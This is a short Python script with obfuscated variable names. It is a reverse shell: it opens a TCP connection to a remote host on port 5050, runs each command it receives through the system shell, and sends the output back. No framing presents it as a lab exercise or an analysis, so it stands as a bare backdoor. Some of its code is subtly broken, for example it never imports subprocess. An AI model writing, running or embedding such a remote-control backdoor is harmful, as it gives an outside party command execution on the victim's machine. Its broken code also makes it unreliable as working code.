import sys , os ,time 
 import socket 
 bASYUAusU = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 PLppsokPSO = '' 
 OIWODFISO = 5050 
 bASYUAusU.connect((PLppsokPSO ,OIWODFISO)) 
 def yyyyyyyyyyYyySSAASKJAKSAS(): 
     while True: 
         OASASASONon = bASYUAusU.recv(1024) 
         if OASASASONon[0:] == 'cd': 
             os.chdir(OASASASONon[2:].encode('utf-8')) 
         if len(OASASASONon) > 0: 
             oCDISDCICjnkjn = subprocess.Popen(OASASASONon[:].encode('utf-8'), shell=True, stdout=subprocess.PIPE ,stderr=subprocess.PIPE,stdin=subprocess.PIPE) 
             kjaxnajkbc = oCDISDCICjnkjn.stdout.read() + oCDISDCICjnkjn.stderr.read() 
             MolLknKN = str(kjaxnajkbc,'utf-8') 
             bASYUAusU.send(str.encode(MolLknKN)) 
     bASYUAusU.close() 
 yyyyyyyyyyYyySSAASKJAKSAS() 
